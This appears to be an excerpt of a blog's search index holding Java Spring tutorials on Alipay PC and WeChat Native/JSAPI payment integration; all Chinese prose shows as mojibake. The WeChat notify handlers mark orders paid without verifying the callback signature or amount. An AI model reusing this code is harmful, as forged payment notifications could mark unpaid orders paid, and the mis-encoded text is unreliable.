        <content type="html"><![CDATA[<h1 id="ÊîØ‰ªòÂÆùPCÁâàÊîØ‰ªò"><a href="#ÊîØ‰ªòÂÆùPCÁâàÊîØ‰ªò" class="headerlink" title="ÊîØ‰ªòÂÆùPCÁâàÊîØ‰ªò"></a>ÊîØ‰ªòÂÆùPCÁâàÊîØ‰ªò</h1><p><a href="https://docs.open.alipay.com/270" target="_blank" rel="noopener"> ÂºÄÂèëÊñáÊ°£ </a></p><pre><code>@RequestMapping(&quot;/alipayPC&quot;)public void alipayPC(@RequestParam(&quot;orderNumber&quot;) String orderNumber, HttpServletRequest request, HttpServletResponse response) throws Exception{    OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;()            .eq(&quot;order_number&quot;,orderNumber));    String orderNo = (System.currentTimeMillis()+&quot;&quot;).substring(1)+(System.nanoTime()+&quot;&quot;).substring(7,8);    String totalAmount = info.getOrderMoney().toString();    String subject = info.getOrderProject();    //Â∞ÅË£ÖËØ∑Ê±ÇÂÆ¢Êà∑Á´Ø    AlipayClient client = new            DefaultAlipayClient (url,app_id,private_key,format,charset,            public_key,signtype );    //ÊîØ‰ªòËØ∑Ê±Ç    AlipayTradePagePayRequest alipayRequest = new AlipayTradePagePayRequest();    alipayRequest.setReturnUrl(&quot;http://XXXX.com/XXXX/api/returnUrlPC?orderNumber=&quot;+orderNumber);    alipayRequest.setNotifyUrl(&quot;http://XXXX.com/XXXX/api/notifyUrl&quot;);    AlipayTradePagePayModel model = new AlipayTradePagePayModel();    model.setProductCode(&quot;FAST_INSTANT_TRADE_PAY&quot;);    model.setOutTradeNo(orderNo);    model.setSubject(subject);    model.setTotalAmount(totalAmount);    model.setBody(info.getOrderProject());    alipayRequest.setBizModel(model);    String form = client.pageExecute(alipayRequest).getBody();    response.setContentType(&quot;text/html;charset=&quot;+charset);    response.getWriter().write(form);    response.getWriter().flush();    response.getWriter().close();}/** * ÊîØ‰ªòÂÆùÊîØ‰ªòÂêéË∑≥ËΩ¨ * */@RequestMapping(&quot;/returnUrlPC&quot;)public void returnUrlPC(HttpServletResponse response,HttpServletRequest request) throws IOException, AlipayApiException {    // Ëé∑ÂèñÊîØ‰ªòÂÆùGETËøáÊù•ÂèçÈ¶à‰ø°ÊÅØÔºàÂÆòÊñπÂõ∫ÂÆö‰ª£Á†ÅÔºâ    String orderNumber = request.getParameter(&quot;orderNumber&quot;);    OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;()            .eq(&quot;order_number&quot;,orderNumber));    Map&lt;String, String&gt; params = new HashMap&lt;String, String&gt;();    Map&lt;String, String[]&gt; requestParams = request.getParameterMap();    for (Iterator&lt;String&gt; iter = requestParams.keySet().iterator(); iter.hasNext();) {        String name = (String) iter.next();        String[] values = (String[]) requestParams.get(name);        String valueStr = &quot;&quot;;        for (int i = 0; i &lt; values.length; i++) {            valueStr = (i == values.length - 1) ? valueStr + values[i] : valueStr + values[i] + &quot;,&quot;;        }        params.put(name, valueStr);    }    params.remove(&quot;orderNumber&quot;);    boolean signVerified = AlipaySignature.rsaCheckV1(params, public_key, charset, signtype);    System.out.println(signVerified);   // if(signVerified){     //   info.setOrderState(1);       // orderInfoService.updateById(info);    //}   response.sendRedirect(&quot;http://www.XXXX.com/orderDetail.html?orderNum=&quot;+orderNumber);}</code></pre><h4 id="Êõ¥Êñ∞Êï∞ÊçÆÂ∫ìÂ∫îËØ•ÊòØnotifyÈáåÈù¢‰øÆÊîπ"><a href="#Êõ¥Êñ∞Êï∞ÊçÆÂ∫ìÂ∫îËØ•ÊòØnotifyÈáåÈù¢‰øÆÊîπ" class="headerlink" title="Êõ¥Êñ∞Êï∞ÊçÆÂ∫ìÂ∫îËØ•ÊòØnotifyÈáåÈù¢‰øÆÊîπ"></a>Êõ¥Êñ∞Êï∞ÊçÆÂ∫ìÂ∫îËØ•ÊòØnotifyÈáåÈù¢‰øÆÊîπ</h4>]]></content>
      
      
      
        <tags>
            
            <tag> ÊîØ‰ªò </tag>
            
            <tag> ÊîØ‰ªòÂÆùPCÊîØ‰ªò </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÂæÆ‰ø°ÊîØ‰ªòPC</title>
      <link href="/2019/01/23/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98PC/"/>
      <url>/2019/01/23/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98PC/</url>
      
        <content type="html"><![CDATA[<h1 id="PCÁ´ØÔºå‰πüÂ∞±ÊòØNativeÊîØ‰ªò"><a href="#PCÁ´ØÔºå‰πüÂ∞±ÊòØNativeÊîØ‰ªò" class="headerlink" title="PCÁ´ØÔºå‰πüÂ∞±ÊòØNativeÊîØ‰ªò"></a>PCÁ´ØÔºå‰πüÂ∞±ÊòØNativeÊîØ‰ªò</h1><p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373866.36634182481.png" alt="ÂõæÁâá"><br><a href="https://pay.weixin.qq.com/wiki/doc/api/native.php?chapter=6_1" target="_blank" rel="noopener"> ÂºÄÂèëÊñáÊ°£ </a></p><p><strong>Áªü‰∏Ä‰∏ãÂçïapi:</strong></p><p><em>ÂøÖÈ°ªÂèÇÊï∞</em></p><p><strong>Appid,mch_id,nonce_str,sign,body,out_trade_noÔºåtotal_fee,spbill_create_ip,notify_url,trade_type</strong></p><pre><code>@RequestMapping(&quot;/wxpayPC&quot;)    @ResponseBody    public Map&lt;String, String&gt; wxpayPC(@RequestParam(&quot;orderNumber&quot;) String orderNumber, HttpServletResponse response, HttpServletRequest request) throws Exception {        WxpayConfig wxpayConfig = new WxpayConfig();        /**         * PCÂπ∂‰∏çÈúÄË¶ÅopenId         * */        OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;()                .eq(&quot;order_number&quot;, orderNumber));        Map&lt;String,String&gt; paraMap = new HashMap&lt;&gt;();        paraMap.put(&quot;appid&quot;,wxpayConfig.getApp_id());        paraMap.put(&quot;body&quot;,info.getOrderProject());        paraMap.put(&quot;mch_id&quot;,wxpayConfig.getMch_id());        paraMap.put(&quot;nonce_str&quot;, WXPayUtil.generateNonceStr());        String randomNum = (int)((Math.random()*9+1)*100000)+&quot;&quot;;        String orderNo =randomNum+orderNumber;        paraMap.put(&quot;out_trade_no&quot;,orderNo);        paraMap.put(&quot;spbill_create_ip&quot;,wxpayConfig.getSpbill_create_ip());        String total_fee = info.getOrderMoney().multiply(new BigDecimal(&quot;100&quot;)).intValue()+&quot;&quot;;        paraMap.put(&quot;total_fee&quot;,total_fee);        paraMap.put(&quot;trade_type&quot;,&quot;NATIVE&quot;);        paraMap.put(&quot;notify_url&quot;,&quot;http://XXXX.com/XXXX/api/wxnotifyPC&quot;);        String apiKey = wxpayConfig.getApi_key();        String sign = WXPayUtil.generateSignature(paraMap,apiKey);        paraMap.put(&quot;sign&quot;,sign);        String xml = WXPayUtil.mapToXml(paraMap);        //Áªü‰∏Ä‰∏ãÂçï https://api.mch.weixin.qq.com/pay/unifiedorder        String unifiedorder_url = &quot;https://api.mch.weixin.qq.com/pay/unifiedorder&quot;;        String xmlStr = HttpUtil.sendPost(unifiedorder_url,xml,false);        System.out.println(xmlStr);        //‰ª•‰∏ãÂÜÖÂÆπÊòØËøîÂõûÂâçÁ´ØÈ°µÈù¢ÁöÑjsonÊï∞ÊçÆ        String prepay_id = &quot;&quot;;//È¢ÑÊîØ‰ªòid        String code_url = &quot;&quot;;        if (xmlStr.indexOf(&quot;SUCCESS&quot;) != -1) {            Map&lt;String, String&gt; map = WXPayUtil.xmlToMap(xmlStr);            prepay_id = (String) map.get(&quot;prepay_id&quot;);            code_url = (String)map.get(&quot;code_url&quot;);        }        Map&lt;String, String&gt; payMap = new HashMap&lt;String, String&gt;();        payMap.put(&quot;appId&quot;, wxpayConfig.getApp_id());        payMap.put(&quot;timeStamp&quot;, WXPayUtil.getCurrentTimestamp()+&quot;&quot;);        payMap.put(&quot;nonceStr&quot;, WXPayUtil.generateNonceStr());        payMap.put(&quot;signType&quot;, &quot;MD5&quot;);        payMap.put(&quot;code_url&quot;,code_url);//Â∞Ücode_urlËøîÂõûÁªôÂâçÂè∞        payMap.put(&quot;package&quot;, &quot;prepay_id=&quot; + prepay_id);        String paySign = WXPayUtil.generateSignature(payMap, wxpayConfig.getApi_key());        payMap.put(&quot;paySign&quot;, paySign);        return payMap;}</code></pre><p><em>Â∞ÜÊï∞ÊçÆÂèëÈÄÅÁªô<a href="https://api.mch.weixin.qq.com/pay/unifiedorderÔºå‰Ω†ÂèØ‰ª•Âà§Êñ≠ËøîÂõûÊòØÂê¶ÊàêÂäüÔºåÊàêÂäüÊó∂ÂÄôÊúâ‰∏Ä‰∏™code_url,‰πüÂ∞±ÊòØ‰∫åÁª¥Á†ÅÁöÑurl„ÄÇ" target="_blank" rel="noopener">https://api.mch.weixin.qq.com/pay/unifiedorderÔºå‰Ω†ÂèØ‰ª•Âà§Êñ≠ËøîÂõûÊòØÂê¶ÊàêÂäüÔºåÊàêÂäüÊó∂ÂÄôÊúâ‰∏Ä‰∏™code_url,‰πüÂ∞±ÊòØ‰∫åÁª¥Á†ÅÁöÑurl„ÄÇ</a></em></p><p><em>‰∏ÄËà¨Ê†ºÂºèweixin://wxpay/bizpayurl?pr=ByrALdk</em></p><p><em>ÁîüÊàê‰∫åÁª¥Á†ÅÔºåÂèØ‰ª•Ë∞ÉÁî®qrcode.jsÂ∫ì</em></p><p><a href="http://www.runoob.com/w3cnote/javascript-qrcodejs-library.html" target="_blank" rel="noopener"> ÊïôÁ®ã </a></p><pre><code>new QRCode(document.getElementById(&quot;qrcode&quot;), &quot;weixin://wxpay/bizpayurl?pr=ByrALdk&quot;);</code></pre><p><strong>Ë∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ï‰ºöÁîüÊàêÊîØ‰ªò‰∫åÁª¥Á†Å</strong></p><p><strong>ÂêéÂè∞ÂõûË∞ÉÊñπÊ≥ï</strong></p><ol><li>Ëé∑Âèñ‰ø°ÊÅØ </li><li>ÊàêÂäüÂêéÔºå‰øÆÊîπËÆ¢ÂçïÁä∂ÊÄÅÔºåËøîÂõûsuccessÁªôÂæÆ‰ø° </li></ol><pre><code>@RequestMapping(&quot;/wxnotifyPC&quot;)    public String wxnotifyPC(HttpServletRequest request,HttpServletResponse response){        InputStream is = null;        try{            is = request.getInputStream();            String xml = WXPayUtil.inputStream2String(is);            Map&lt;String,String&gt; notifyMap = WXPayUtil.xmlToMap(xml);            String orderNumber = &quot;&quot;;            if(notifyMap.get(&quot;return_code&quot;).equals(&quot;SUCCESS&quot;)) {                orderNumber = notifyMap.get(&quot;out_trade_no&quot;).substring(6);                OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;()                        .eq(&quot;order_number&quot;, orderNumber));                info.setOrderState(1);                orderInfoService.updateById(info);                String amount = notifyMap.get(&quot;total_fee&quot;);                System.out.println(&quot;ÂÆûÈôÖ‰ªòÊ¨æÔºö&quot;+amount);            }            response.getWriter().write(&quot;&lt;xml&gt;&lt;return_code&gt;&lt;![CDATA[SUCCESS]]&gt;&lt;/return_code&gt;&lt;/xml&gt;&quot;);            is.close();        } catch (Exception e) {            e.printStackTrace();        }        return null;}</code></pre><p><strong>ÊÄùËÄÉÔºåÂâçÂè∞</strong></p><pre><code>ÂâçÂè∞ÔºåÂú®Êâ´Á†ÅÂêéÂ¶Ç‰ΩïË∑≥ËΩ¨ÊîØ‰ªòÈ°µÈù¢ÔºåÂõ†‰∏∫‰∫åÁª¥Á†ÅÂá∫Áé∞ÂêéÔºåÊàëÂπ∂‰∏çÁü•ÈÅìËøô‰∏™‰∫åÁª¥Á†ÅÊòØÂê¶Ë¢´ÊâãÊú∫Êâ´Á†ÅÔºåÊâÄ‰ª•ÊàëÂú®Ëøô‰∏™Êâ´Á†ÅÁïåÈù¢ËÆæÁΩÆ‰∫ÜÂÆöÊó∂Âô®1Ôºå‰∫åÁª¥Á†ÅÁîüÊàêÂêé„ÄÇ1ÁßíÊâßË°åÊü•ËØ¢ÁöÑajaxÔºåÂØπËøô‰∏™orderÊü•ËØ¢ÊòØÂê¶ÊàêÂäüÔºåÂ¶ÇÊûúÊàêÂäüÔºåËøîÂõûËÆ¢ÂçïÁïåÈù¢„ÄÇÂÆöÊó∂Âô®2Ôºå1Â∞èÊó∂Âà∑Êñ∞‰∫åÁª¥Á†ÅÔºåÂ¶ÇÊûúËøô‰∏™Áî®Êà∑ÂÅúÁïôÂú®Ëøô‰∏™ÁïåÈù¢ÔºåÈò≤Ê≠¢‰∫åÁª¥Á†ÅÂ§±Êïà</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ÊîØ‰ªò </tag>
            
            <tag> ÂæÆ‰ø°ÊîØ‰ªò </tag>
            
            <tag> NATIVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÂæÆ‰ø°ÊîØ‰ªòjsapi</title>
      <link href="/2019/01/23/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98jsapi/"/>
      <url>/2019/01/23/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98jsapi/</url>
      
        <content type="html"><![CDATA[<h1 id="ÂæÆ‰ø°ÊîØ‰ªòjsapi"><a href="#ÂæÆ‰ø°ÊîØ‰ªòjsapi" class="headerlink" title="ÂæÆ‰ø°ÊîØ‰ªòjsapi"></a>ÂæÆ‰ø°ÊîØ‰ªòjsapi</h1><p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373867.23557358028.png" alt="ËÆ¢ÂçïË°®"><br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373867.56382783821.png" alt="ËÆ¢ÂçïÂàóË°®"><br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373867.81261378410.png" alt="ÊîØ‰ªòÁïåÈù¢"><br><strong>ÂïÜÊà∑Â∑≤ÊúâH5ÂïÜÂüéÁΩëÁ´ôÔºåÁî®Êà∑ÈÄöËøáÊ∂àÊÅØÊàñÊâ´Êèè‰∫åÁª¥Á†ÅÂú®ÂæÆ‰ø°ÂÜÖÊâìÂºÄÁΩëÈ°µÊó∂ÔºåÂèØ‰ª•Ë∞ÉÁî®ÂæÆ‰ø°ÊîØ‰ªòÂÆåÊàê‰∏ãÂçïË¥≠‰π∞ÁöÑÊµÅÁ®ã„ÄÇ</strong></p><p><a href="https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=7_3" target="_blank" rel="noopener"> ÂºÄÂèëÊ≠•È™§ </a></p><p><a href="https://blog.csdn.net/javaYouCome/article/details/79473743" target="_blank" rel="noopener"> ÊäÄÊúØÂçöÂÆ¢ </a></p><h2 id="jspiÊîØ‰ªòÔºåÊòØÊåáÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÈáåÈù¢ÁöÑÊâìÂºÄÁΩëÁ´ôÔºåÊîØ‰ªò"><a href="#jspiÊîØ‰ªòÔºåÊòØÊåáÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÈáåÈù¢ÁöÑÊâìÂºÄÁΩëÁ´ôÔºåÊîØ‰ªò" class="headerlink" title="jspiÊîØ‰ªòÔºåÊòØÊåáÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÈáåÈù¢ÁöÑÊâìÂºÄÁΩëÁ´ôÔºåÊîØ‰ªò"></a>jspiÊîØ‰ªòÔºåÊòØÊåáÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÈáåÈù¢ÁöÑÊâìÂºÄÁΩëÁ´ôÔºåÊîØ‰ªò</h2><h2 id="Â§ßËá¥ÊµÅÁ®ã"><a href="#Â§ßËá¥ÊµÅÁ®ã" class="headerlink" title="Â§ßËá¥ÊµÅÁ®ã"></a>Â§ßËá¥ÊµÅÁ®ã</h2><ol><li>Ëé∑ÂèñÊâÄÈúÄÂèÇÊï∞ </li><li>ÂèëÈÄÅÁªôÁªü‰∏Ä‰∏ãÂçïÁöÑÊé•Âè£ </li><li>Ê†πÊçÆËøîÂõûÁöÑÂèÇÊï∞ÔºåËøõË°åËß£ÊûêÔºåÂ¶ÇÊûúÊàêÂäüÔºåÂ∞ÜÈÉ®ÂàÜÂèÇÊï∞ÂèëÈÄÅÁªôÂâçÂè∞„ÄÇÊ≥®ÊÑèÂâçÂè∞ÁöÑÊµèËßàÂô®ÊòØÂæÆ‰ø°ÂÜÖÁΩÆÊµèËßàÂô®ÔºåÊúâ‰∏Ä‰∏™ÂÜÖÁΩÆÁöÑjsÂØπË±°ÔºåÂèØ‰ª•ÈÄöËøájsÂØπË±°ÔºåË∞ÉËµ∑ÊîØ‰ªò </li><li>ÊúÄÂêéË∑≥ËΩ¨Âà∞ÁªìÊûúÈ°µÈù¢ </li></ol><p><strong>Ê≠£ÂºèÂºÄÂèë</strong></p><p><em>jsapiÁªü‰∏Ä‰∏ãÂçïapiÂàóË°®</em><br><em>‰∏ãÈù¢Âàó‰∏æÂøÖÈ°ªÂ≠óÊÆµ</em></p><p><strong>Appid,mch_id,nonce_str,sign,body,out_trade_no,total_fee,spbill_create_ip,notify_url,trade_type,openid</strong></p><p>Ê≥®ÊÑèÔºö <strong>total_feeÊòØÂàÜ‰∏∫Âçï‰Ωç</strong></p><pre><code>String total_fee = info.getOrderMoney().multiply(new BigDecimal(&quot;100&quot;)).intValue()+&quot;&quot;;</code></pre><p><strong>ËØ¥‰∏ã‰∏çÂ•ΩËé∑ÂèñÁöÑ</strong></p><p><strong>spbill_create_ip</strong> :ÊàëÂΩìÊó∂Â∞±ÊòØÂÜô‰∫Ü127.0.0.1ÔºåÊàëÂπ∂‰∏çÊ∏ÖÊ•öÊÄé‰πàËé∑Âèñ</p><p><strong>notify_url</strong> :ÂÜôÂÖ¨ÁΩëÂèØ‰ª•ËÆøÈóÆÁöÑÂú∞ÂùÄÔºåÊúÄÂ•ΩÂéªÁúã‰∏ãÂÆòÁΩëÁöÑ‰ªãÁªçÔºå</p><p><strong>out_trade_no</strong> :Ââç6‰ΩçÊòØÈöèÊú∫Êï∞ÔºåÂêéÈù¢ÊòØÊï∞ÊçÆÂ∫ì‰∏≠ÂÆûÈôÖÁöÑËÆ¢ÂçïÁºñÂè∑ÔºåËøôÊ†∑ÊòØ‰∏∫‰∫ÜÂõûË∞ÉÁöÑÊó∂ÂÄôËé∑ÂèñËÆ¢ÂçïÁºñÂè∑ÔºåÂΩìÁÑ∂‰πüÂèØ‰ª•‰ΩøÁî®Âà´ÁöÑÊñπÊ≥ï„ÄÇ</p><p><strong>openid</strong> :ÊòØÊåá‰∏Ä‰∏™Áî®Êà∑Âà∞‰∏Ä‰∏™ÂÖ¨‰ºóÂè∑ÔºåÂØπÂ∫îÁöÑ‰∏Ä‰∏™keyÔºåÊòØÂîØ‰∏ÄÁöÑÔºåËé∑ÂèñÊñπÊ≥ï <a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&id=mp1421140842" target="_blank" rel="noopener"> ÊñáÊ°£</a></p><p><em>ÊàëÁöÑÊÄùË∑ØÊòØÔºåÂÖàËé∑ÂèñcodeÔºåH5ÁïåÈù¢ÈáåÈù¢ÔºåÊúâ‰∏Ä‰∏™ÂéªÊîØ‰ªòÊåâÈíÆÔºåËÄåÂéªÊîØ‰ªòÊåâÈíÆÊòØ‰∏Ä‰∏™Ë∂ÖÈìæÊé•</em></p><pre><code>https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx1111111111111111&amp;redirect_uri=http%3A%2F%2Fm.XXXX.com%2FpayList.html%3ForderNumber%3D&quot;+orderNum+&quot;&amp;response_type=code&amp;scope=snsapi_base&amp;state=123#wechat_redirect&quot;;</code></pre><p><em>ËøôÈáåÈù¢ÁöÑredirect_uriÈúÄË¶ÅÊ†ºÂºèÂåñ</em></p><pre><code>import java.net.URLEncoder;String formatUrl = URLEncoder.encode(&quot;http://m.XXXX.com/payList.html?orderNumber=XXXXXXX&quot;,&quot;UTF_8&quot;);</code></pre><p><em>Ë∑≥ËΩ¨ÂõûÊù•ÁöÑÊó∂ÂÄôÊòØ</em></p><pre><code>http://m.XXXX.com/payList.html?orderNumber=XXXXXXX&amp;code=sdhjsdhfjhasjhfhjasdhbavbnb</code></pre><p><em>Ëøô‰∏™codeÂë¢Ôºå‰Ω†ÂºÄÂèëÂú®ÁîµËÑëÁ´ØÊòØÁúã‰∏çËßÅÁöÑÔºåËøô‰πüÂ∞±ÊòØÂæÆ‰ø°ÂùëÁöÑÂú∞ÊñπÔºåÊâÄ‰ª•‰Ω†</em> <strong>‰∏ãËΩΩÂæÆ‰ø°ÂºÄÂèëËÄÖÂ∑•ÂÖ∑</strong></p><p><em>Ëé∑Âèñcode‰πãÂêéÔºåÁÇπÂáªÂæÆ‰ø°ÊîØ‰ªòÔºåÂèëÈÄÅajaxËØ∑Ê±ÇÁªôÂêéÂè∞</em></p><pre><code>@RequestMapping(&quot;/payH5&quot;)    @ResponseBody    public Object payH5(@RequestParam(&quot;orderNumber&quot;) String orderNumber, @RequestParam(&quot;type&quot;) Integer type, HttpServletRequest request, HttpServletResponse response,@RequestParam(value = &quot;code&quot;,defaultValue = &quot;&quot;)String code) throws Exception{        try{            OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;()                    .eq(&quot;order_number&quot;, orderNumber));            ModelAndView modelAndView = new ModelAndView();            //ÊîØ‰ªòÂÆùÊîØ‰ªò            if(type.intValue()==1){               response.sendRedirect(&quot;http://m.XXXX.com/alipay.html?orderNumber=&quot;+orderNumber);                //ÂæÆ‰ø°ÊîØ‰ªò            }else if(type.intValue()==0){                if(&quot;&quot;.equals(code)){                   return &quot;ËøîÂõûÈîôËØØÁïåÈù¢&quot;;                }                WxpayConfig wxpayConfig = new WxpayConfig();                //Ê≠§Â§ÑËé∑Âèñopenid,ÂêéÂè∞ÂèëËØ∑Ê±ÇÁªôÔºåÈÄöËøácodeÔºåappIdÔºåappsecret                String res = HttpUtil.sendGet(&quot;https://api.weixin.qq.com/sns/oauth2/access_token&quot;,                        &quot;appid=&quot;+wxpayConfig.getApp_id()+&quot;&amp;secret=&quot;+wxpayConfig.getApp_secret()+&quot;&amp;code=&quot;+code+&quot;&amp;grant_type=authorization_code&quot;);                JSONObject json = JSONObject.parseObject(res);                String openId = json.getString(&quot;openid&quot;);                Map&lt;String,String&gt; paraMap = new HashMap&lt;&gt;();                paraMap.put(&quot;appid&quot;,wxpayConfig.getApp_id());                paraMap.put(&quot;body&quot;,info.getOrderProject());                paraMap.put(&quot;mch_id&quot;,wxpayConfig.getMch_id());                paraMap.put(&quot;nonce_str&quot;, WXPayUtil.generateNonceStr());                paraMap.put(&quot;openid&quot;,openId);                String randomNum = (int)((Math.random()*9+1)*100000)+&quot;&quot;;                String orderNo =randomNum+orderNumber;                paraMap.put(&quot;out_trade_no&quot;,orderNo);                paraMap.put(&quot;spbill_create_ip&quot;,wxpayConfig.getSpbill_create_ip());                String total_fee = info.getOrderMoney().multiply(new BigDecimal(&quot;100&quot;)).intValue()+&quot;&quot;;                paraMap.put(&quot;total_fee&quot;,total_fee);                paraMap.put(&quot;trade_type&quot;,wxpayConfig.getTrade_type());                paraMap.put(&quot;notify_url&quot;,&quot;http://XXXX.com/XXXX/api/wxnotify?orderNumber=&quot;+orderNumber);                String apiKey = wxpayConfig.getApi_key();                String sign = WXPayUtil.generateSignature(paraMap,apiKey);                paraMap.put(&quot;sign&quot;,sign);                String xml = WXPayUtil.mapToXml(paraMap);                //Áªü‰∏Ä‰∏ãÂçï https://api.mch.weixin.qq.com/pay/unifiedorder                String unifiedorder_url = &quot;https://api.mch.weixin.qq.com/pay/unifiedorder&quot;;                String xmlStr = HttpUtil.sendPost(unifiedorder_url,xml,false);                //‰ª•‰∏ãÂÜÖÂÆπÊòØËøîÂõûÂâçÁ´ØÈ°µÈù¢ÁöÑjsonÊï∞ÊçÆ                String prepay_id = &quot;&quot;;//È¢ÑÊîØ‰ªòid                if (xmlStr.indexOf(&quot;SUCCESS&quot;) != -1) {                    Map&lt;String, String&gt; map = WXPayUtil.xmlToMap(xmlStr);                    prepay_id = (String) map.get(&quot;prepay_id&quot;);                }                Map&lt;String, String&gt; payMap = new HashMap&lt;String, String&gt;();                payMap.put(&quot;appId&quot;, wxpayConfig.getApp_id());                payMap.put(&quot;timeStamp&quot;, WXPayUtil.getCurrentTimestamp()+&quot;&quot;);                payMap.put(&quot;nonceStr&quot;, WXPayUtil.generateNonceStr());                payMap.put(&quot;signType&quot;, &quot;MD5&quot;);                payMap.put(&quot;package&quot;, &quot;prepay_id=&quot; + prepay_id);                String paySign = WXPayUtil.generateSignature(payMap, wxpayConfig.getApi_key());                payMap.put(&quot;paySign&quot;, paySign);                return payMap;            }            return &quot;&quot;;        }catch (Exception e){            e.printStackTrace();        }        return &quot;end&quot;;//        return new SuccessResponseData();    }</code></pre><p><strong>Ëé∑Âèñsign</strong></p><p><a href="https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=11_1" target="_blank" rel="noopener"> Ëé∑Âèñsign </a></p><p><em>‰∏ãËΩΩÂêéÔºåÈáåÈù¢Êúâ‰∏Ä‰∫õÂ∑•ÂÖ∑Á±ªÔºåWXPayUtilÈáåÈù¢Êúâ‰∏Ä‰∏™ÊñπÊ≥ïÂèØ‰ª•Ëé∑Âèñ</em></p><p><strong>ËøîÂõûÊï∞ÊçÆÂà∞ÂâçÂè∞ÂêéÔºåÂâçÂè∞Ë∞ÉÁî®jsÂØπË±°ÔºåÊâßË°å</strong></p><pre><code> WeixinJSBridge.invoke( &apos;getBrandWCPayRequest&apos;, {                &quot;appId&quot;:appId,     //ÂÖ¨‰ºóÂè∑ÂêçÁß∞,Áî±ÂïÜÊà∑‰º†ÂÖ•                &quot;timeStamp&quot;:timeStamp,         //Êó∂Èó¥Êà≥,Ëá™1970Âπ¥‰ª•Êù•ÁöÑÁßíÊï∞                &quot;nonceStr&quot;:nonceStr, //ÈöèÊú∫‰∏≤                &quot;package&quot;:package,                &quot;signType&quot;:signType,         //ÂæÆ‰ø°Á≠æÂêçÊñπÂºèÔºö                &quot;paySign&quot;:paySign //ÂæÆ‰ø°Á≠æÂêç            }, function(res){                console.log(res);                window.location.href = &quot;http://m.XXXX.com/orderDetail.html?orderNum=&quot;+orderNumber;                // if(res.err_msg == &quot;get_brand_wcpay_request:ok&quot; ) {                //     console.log(&apos;ÊîØ‰ªòÊàêÂäü&apos;);                //     //ÊîØ‰ªòÊàêÂäüÂêéË∑≥ËΩ¨ÁöÑÈ°µÈù¢                // }else if(res.err_msg == &quot;get_brand_wcpay_request:cancel&quot;){                //     console.log(&apos;ÊîØ‰ªòÂèñÊ∂à&apos;);                // }else if(res.err_msg == &quot;get_brand_wcpay_request:fail&quot;){                //     console.log(&apos;ÊîØ‰ªòÂ§±Ë¥•&apos;);                // } //‰ΩøÁî®‰ª•‰∏äÊñπÂºèÂà§Êñ≠ÂâçÁ´ØËøîÂõû,ÂæÆ‰ø°Âõ¢ÈòüÈÉëÈáçÊèêÁ§∫Ôºöres.err_msgÂ∞ÜÂú®Áî®Êà∑ÊîØ‰ªòÊàêÂäüÂêéËøîÂõûok,‰ΩÜÂπ∂‰∏ç‰øùËØÅÂÆÉÁªùÂØπÂèØÈù†„ÄÇ}</code></pre><p>Â∞±‰ºöÊâßË°åÂæÆ‰ø°ÊîØ‰ªòÔºå‰∏çÁÆ°ÊàêÂäüÊ≤°ÊúâÔºåÈÉΩ‰ºöË∑≥ËΩ¨Âà∞orderDetailÁïåÈù¢ÔºåÊü•ÁúãorderËØ¶ÊÉÖ</p><p><strong>ÂæÆ‰ø°ÂõûË∞É</strong></p><p><em>ÂæÆ‰ø°‰ºöËøîÂõûÁªìÊûú</em></p><p>ÊàëÂ∫îËØ•Â§ÑÁêÜ‰ªÄ‰πà</p><ol><li>ÂëäËØâÂæÆ‰ø°ÔºåÊàëÊî∂Âà∞‰∫ÜÔºåËøîÂõûsuccess </li><li>ÂØπËÆ¢Âçï‰ø°ÊÅØÔºåËé∑ÂèñorderNumÔºåÂØπËÆ¢ÂçïÁä∂ÊÄÅËøõË°åÊõ¥Êñ∞ </li></ol><pre><code>@RequestMapping(&quot;/wxnotify&quot;)public String wxnotify(HttpServletRequest request,HttpServletResponse response){    InputStream is = null;    try{    is = request.getInputStream();    String xml = WXPayUtil.inputStream2String(is);    Map&lt;String,String&gt; notifyMap = WXPayUtil.xmlToMap(xml);    if(notifyMap.get(&quot;return_code&quot;).equals(&quot;SUCCESS&quot;)) {    String orderNumber = notifyMap.get(&quot;out_trade_no&quot;).substring(6);    OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;()    .eq(&quot;order_number&quot;, orderNumber));    info.setOrderState(1);    orderInfoService.updateById(info);    String amount = notifyMap.get(&quot;total_fee&quot;);    System.out.println(&quot;ÂÆûÈôÖ‰ªòÊ¨æÔºö&quot;+amount);    }    response.getWriter().write(&quot;&lt;xml&gt;&lt;return_code&gt;&lt;![CDATA[SUCCESS]]&gt;&lt;/return_code&gt;&lt;/xml&gt;&quot;);    is.close();    } catch (Exception e) {    e.printStackTrace();    }    return null;}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ÊîØ‰ªò </tag>
            
            <tag> ÂæÆ‰ø°H5ÊîØ‰ªò </tag>
            
            <tag> jsapi springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ËØªÊ¢ÅÈ£û-RPCÊ°ÜÊû∂Âá†Ë°å‰ª£Á†ÅÂ∞±Â§ü‰∫Ü   ÊúâÊÑü</title>
